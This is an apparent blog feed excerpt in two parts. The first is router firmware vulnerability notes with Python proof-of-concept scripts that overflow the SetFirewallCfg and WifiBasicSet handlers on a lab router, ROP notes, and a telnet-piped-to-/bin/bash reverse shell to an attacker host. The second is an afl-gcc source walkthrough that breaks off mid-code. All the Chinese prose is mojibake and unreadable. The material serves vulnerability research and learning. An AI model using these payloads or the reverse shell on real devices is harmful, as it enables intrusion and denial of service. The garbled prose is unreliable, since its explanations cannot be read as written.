<h3 id="CVE-2023-27021"><a href="#CVE-2023-27021" class="headerlink" title="CVE-2023-27021"></a>CVE-2023-27021</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi=DQ0=GODlcIEHfh+fhfrD&alichlgref=https://cn.bing.com/#toc-5">è·¯ç”±å™¨é€šç”¨0dayæ¼æ´æŒ–æ˜åŠRCEæ€è·¯</a></p>
<p>ç›¸åŒçš„å›ºä»¶ï¼Œå‡½æ•°æ˜¯ <code>formSetFirewallCfg</code></p>
<p>PoC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.85.131/goform/SetFirewallCfg&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;password=hamster&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">500</span></span><br><span class="line">data = &#123;<span class="string">&quot;firewallEn&quot;</span>: payload&#125;</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯å¯ä»¥æ§åˆ¶å‡½æ•°æ‰§è¡Œæµçš„ï¼Œå› æ­¤éœ€è¦å­¦ä¹ ä¸€ä¸‹ROPæ˜¯å¦‚ä½•å†™</p>
<ul>
<li>libcbase: åœ¨gdbé‡Œé¢vmmapä¸€ä¸‹</li>
<li>ROP: éœ€è¦çŸ¥é“å„ä¸ªå¯„å­˜å™¨çš„ä½œç”¨</li>
<li>è·¯ç”±å™¨ä¸€èˆ¬ä¸æ”¯æŒbin&#x2F;bashå‘½ä»¤ï¼Œé€‰æ‹©ç”¨telnetæ¥getshell</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨pop pc æ¥æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop &#123;r3, pc&#125;</span><br><span class="line">r3_val: system_addr</span><br><span class="line">pc: å°†åœ°å€æ”¹æˆä¸‹é¢æŒ‡ä»¤åœ°å€</span><br><span class="line">	mov r0, sp // r0ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</span><br><span class="line">	blx, r3</span><br></pre></td></tr></table></figure>

<p>telnet åå¼¹shell</p>
<ul>
<li>telnetåœ¨æ”»å‡»è€…ä¸»æœºx.x.x.xåŠport1å¼€å¯ç›‘å¬ç”¨æˆ·ï¼Œå¹¶å°†æ­¤å¤„Telnetçš„æ ‡å‡†è¾“å…¥é€šè¿‡ç®¡é“ç¬¦ä¼ ç»™åé¢å‘½ä»¤<code>/bin/bash</code>æ‰§è¡Œï¼Œå†å°†<code>/bin/bash</code>çš„è¾“å‡ºç»“æœä½œä¸ºåé¢<code>telnet</code>çš„è¾“å…¥ã€‚æ­¤æ—¶é€šè¿‡ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ªæ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œé€šè¿‡<code>/bin/bash</code>å¤„ç†åå†ç”±å¦ä¸€ä¸ªç«¯å£è¾“å‡ºã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># (x.x.x.xä¸ºæ”»å‡»æœºip)</span></span><br><span class="line">$ telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555</span><br><span class="line"><span class="comment"># æˆ‘ä»¬ç›‘å¬5555ç«¯å£</span></span><br></pre></td></tr></table></figure>

<h3 id="å°è¯•"><a href="#å°è¯•" class="headerlink" title="å°è¯•"></a>å°è¯•</h3><p>éš¾ç‚¹åœ¨äº</p>
<ul>
<li>å¯»æ‰¾ï¼šæ‰¾åˆ°æ¼æ´ç‚¹</li>
<li>äº¤äº’ï¼šç”¨æˆ·å¦‚ä½•èµ°åˆ°æ¼æ´ä»£ç </li>
<li>è°ƒè¯•ï¼šéªŒè¯ï¼Œä»¥åŠæ˜¯å¦å¯ä»¥åŠ«æŒå‡½æ•°æ‰§è¡Œæµ</li>
</ul>
<p>ä»httpå¼€å§‹ï¼Œå¯»æ‰¾å±é™©å‡½æ•°ï¼Œå¦‚æœèƒ½æŒ–åˆ°æ¼æ´å‘cveå®˜ç½‘æäº¤</p>
<p>ä»ä¸Šå¾€ä¸‹ä¸€ä¸ªä¸ªçœ‹</p>
<ul>
<li>ç”¨æˆ·å¯æ§ï¼šç”±ç”¨æˆ·è¾“å…¥</li>
<li>å­˜åœ¨å±é™©å‡½æ•°è°ƒç”¨</li>
</ul>
<p>strcpy&#x2F;memcpyï¼Œä½†æ˜¯æ‰¾åˆ°çš„å¤§éƒ¨åˆ†éƒ½å­˜åœ¨ç¼–å·</p>
<ul>
<li>form_fast_setting_wifi_set</li>
<li>fromSetIpMacBind</li>
<li>SetSysTimeCfg</li>
<li>fromSetSysTime</li>
<li>setSchedWifi</li>
</ul>
<p>formWifiBasicSet åœ¨ <code>V15.03.05.18</code> å­˜åœ¨CVEç¼–å·ï¼Œä½†æ˜¯ä½œè€…åªå†™äº†ä¸€ä¸ªï¼Œä½†æ˜¯å­˜åœ¨ä¸¤ä¸ªæ¼æ´ç‚¹</p>
<p><a href="https://www.cnblogs.com/Amalll/p/16527552.html">CVE-2022-37175</a>åˆ©ç”¨çš„æ˜¯ <code>security_5g</code> ä½†æ˜¯è¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨ <code>security</code></p>
<ul>
<li>ç”³è¯·äº†ï¼Œå¤±è´¥äº†ï¼Œé‡å¤é¡¹ï¼Œçœ‹æ¥ä¸æ˜¯æ¡æ¼ğŸ˜¢ï¼Œå°±å½“å¤ç°äº†</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">formWifiBasicSet</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wrlEn = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  wrlEn_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn_5g&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid_5g = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid_5g&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hideSsid || !ssid || !security || !wrlPwd || !hideSsid_5g || !ssid_5g || !security_5g || !wrlPwd_5g )</span><br><span class="line">  &#123;</span><br><span class="line">    v57 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_9CD24</span>(<span class="string">&quot;wl2g.ssidxx.ssid&quot;</span>, ssid, v48, v47);</span><br><span class="line">    v6 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.security&quot;</span>, v48, v47);</span><br><span class="line">    <span class="built_in">GetValue</span>(v6, (<span class="type">char</span> *)v47 + <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpapsk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpa2psk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpawpa2psk&quot;</span>) )</span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)<span class="string">&quot;wpapsk&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="built_in">strcpy</span>(s, security);</span><br><span class="line">    <span class="comment">// ç»è¿‡è°ƒè¯•ï¼Œä¸Šé¢çš„buffer overflow å¯ä»¥è¦†ç›– v48 å’Œ v49 è¿™ä¸¤ä¸ªå˜é‡ï¼Œä»è€Œé€ æˆDoS</span></span><br><span class="line">    v7 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.wpapsk_type&quot;</span>, v48, v47);   </span><br></pre></td></tr></table></figure>


<p>è¦†ç›–æ ˆä¸Šçš„å˜é‡ï¼Œå¯¼è‡´å‡½æ•°è°ƒç”¨æ—¶crashï¼ŒPoC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">url = <span class="string">b&quot;http://192.168.85.131/login/Auth&quot;</span></span><br><span class="line">vuln = <span class="string">b&quot;http://192.168.85.131/goform/WifiBasicSet/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x13c</span> + (<span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>) + (<span class="string">&#x27;c&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">vuln_data = &#123;</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vuln_data_5g = &#123;</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_5g</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data_5g)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure>


<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>IDAæ¼æ´æ‰«ææ’ä»¶ï¼š<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p>
<p>å·¥å…·å®‰è£…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Accenture/VulFi</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†æŸäº›æ–‡ä»¶å…¶æ”¾åœ¨ida&#x2F;pluginsç›®å½•ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins</span><br></pre></td></tr></table></figure>

<p>åœ¨searchæ å°±èƒ½æ‰¾åˆ° <code>VulFi</code> å›¾æ ‡</p>
<p>å†™è‡ªå·±çš„è§„åˆ™ï¼šå°†alt_names æ”¹æˆè‡ªå·±çš„åˆ—è¡¨å°±è¡Œï¼Œå¯ä»¥å‚è€ƒé»˜è®¤çš„ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RULE NAME&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;alt_names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;function_name_to_look_for&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;wrappers&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mark_if&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;High&quot;</span><span class="punctuation">:</span><span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Medium&quot;</span><span class="punctuation">:</span><span class="string">&quot;False&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Low&quot;</span><span class="punctuation">:</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>afl-gcc</title>
    <url>/2024/03/09/afl-gcc/</url>
    <content><![CDATA[<blockquote>
<p>æ¨¡ç³Šæµ‹è¯•æ’æ¡©</p>
</blockquote>
<span id="more"></span>

<p><strong>æƒ³è¦é˜…è¯»çš„æ›´æ¸…æ¥šï¼Œå¯ä»¥æ‰‹åŠ¨ç¼–è¯‘aflç„¶åä½¿ç”¨gdbè°ƒè¯•ï¼Œæ›´æ¸…æ™°çš„äº†è§£æ¯ä¸€æ­¥çš„ç»“æœ</strong></p>
<h1 id="afl-gcc-as"><a href="#afl-gcc-as" class="headerlink" title="afl gcc &amp;&amp; as"></a>afl gcc &amp;&amp; as</h1><blockquote>
<p>å¦‚ä½•è¿›è¡Œé™æ€æ’æ¡©</p>
</blockquote>
<p>afl-gcc æ˜¯ gcc, g++, clang, clang++ çš„åŒ…è£…å™¨ã€‚å®ƒçš„ä½œç”¨æ˜¯è®¾ç½®ä¸€äº›ç¼–è¯‘å‚æ•°ï¼Œç„¶åè°ƒç”¨è¿™äº›ç¼–è¯‘å™¨ã€‚äº‹å®ä¸Šï¼Œç¼–è¯‘å‡ºæ¥çš„ afl-clang, afl-g++ ç­‰æ–‡ä»¶éƒ½æ˜¯æŒ‡å‘ afl-gcc çš„è½¯é“¾æ¥ã€‚</p>
<p>afl-gcc éœ€è¦çŸ¥é“ afl-as çš„è·¯å¾„ã€‚afl-as æ˜¯æ’æ¡©å™¨ï¼Œæˆ‘ä»¬å°†ä¼šåœ¨åæ–‡åˆ†æå®ƒçš„é€»è¾‘ã€‚å¯ä»¥é€šè¿‡ AFL_PATH æŒ‡å®šã€‚</p>
<h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>afl-gcc çš„å…¥å£ç‚¹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// isatty: æ™®é€šæ–‡ä»¶è¿”å›0ï¼Œè®¾å¤‡è¿”å›-1</span></span><br><span class="line">  <span class="comment">// 2: stderr  æ ‡å‡†é”™è¯¯è®¾å¤‡  </span></span><br><span class="line">  <span class="comment">// ç¯å¢ƒå˜é‡ï¼šå¦‚æœä¸æ˜¯ QUIET æ¨¡å¼ï¼Œåˆ™è¾“å‡ºaflä¿¡æ¯</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ¤æ–­ç”¨æ³•ï¼Œæ²¡æœ‰å‚æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¯»æ‰¾ afl-as è·¯å¾„</span></span><br><span class="line">  <span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½®afl-gccå‚æ•°</span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// execvp: ç¨‹åºç«‹å³è¢«å®é™…å‘½ä»¤æ›¿æ¢ã€‚</span></span><br><span class="line">  <span class="comment">// æˆ‘ä»¬çš„ç¨‹åºå·²è¢«å®Œå…¨æ¥ç®¡ï¼Œå› æ­¤execvp()ä¹‹åçš„æ‰€æœ‰å†…å®¹å‡å°†execvp()æ‰§è¡Œï¼</span></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><p>å¯»æ‰¾ afl-as è·¯å¾„</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argv0 æ˜¯ç¨‹åºåï¼Œafl-gcc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç¯å¢ƒå˜é‡å¯»æ‰¾åˆ° AFL_PATH</span></span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœç¯å¢ƒå­˜åœ¨AFL_PATH åˆ™åœ¨ç›®å½•æŒ‡å®šçš„pathå¯»æ‰¾</span></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// accessï¼šåˆ¤æ–­asæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¯»æ‰¾åˆ°æœ€åä¸€ä¸ª &#x27;/&#x27;</span></span><br><span class="line">  <span class="comment">// /usr/bin/afl-gcc =&gt; /afl-gcc</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™é‡Œæ¯”è¾ƒå¥‡å¦™</span></span><br><span class="line">    <span class="comment">// /usr/bin/afl-gcc =&gt; /usr/bin\0afl-gcc</span></span><br><span class="line">    <span class="comment">// strdup å°±è·å¾—äº† dir = /usr/bin</span></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fallbackï¼Œå¦‚æœå‰ä¸¤ä¸ªä½ç½®éƒ½æ‰¾ä¸åˆ°ï¼Œåˆ™å»ç¼–è¯‘ afl-gcc æ—¶å®šä¹‰çš„ AFL_PATH å»æ‰¾</span></span><br><span class="line">  <span class="comment">// AFL_PATH ç”± Makefile å®šä¹‰æˆ &quot;/usr/local/lib/afl&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Makefileä¸­ï¼Œä½¿ç”¨<code>gcc -D</code>æŒ‡å®šç¯å¢ƒå˜é‡</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">PREFIX     ?= /usr/local</span><br><span class="line">BIN_PATH    = <span class="variable">$(PREFIX)</span>/bin</span><br><span class="line">HELPER_PATH = <span class="variable">$(PREFIX)</span>/lib/afl</span><br><span class="line">DOC_PATH    = <span class="variable">$(PREFIX)</span>/share/doc/afl</span><br><span class="line">MISC_PATH   = <span class="variable">$(PREFIX)</span>/share/afl</span><br><span class="line"></span><br><span class="line"><span class="comment"># PROGS intentionally omit afl-as, which gets installed elsewhere.</span></span><br><span class="line"></span><br><span class="line">PROGS       = afl-gcc afl-fuzz afl-showmap afl-tmin afl-gotcpu afl-analyze</span><br><span class="line">SH_PROGS    = afl-plot afl-cmin afl-whatsup</span><br><span class="line"></span><br><span class="line">CFLAGS     ?= -O3 -funroll-loops</span><br><span class="line">CFLAGS     += -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign \</span><br><span class="line">	      -DAFL_PATH=\<span class="string">&quot;<span class="variable">$(HELPER_PATH)\&quot;</span> -DDOC_PATH=\&quot;<span class="variable">$(DOC_PATH)\&quot;</span> \</span></span><br><span class="line"><span class="string">	      -DBIN_PATH=\&quot;<span class="variable">$(BIN_PATH)\&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="edit-param"><a href="#edit-param" class="headerlink" title="edit_param"></a>edit_param</h3><p>ç¼–è¯‘å™¨å‚æ•°è®¾ç½®ï¼Œå¿½ç•¥æ‰ <code>__APPLE__</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span 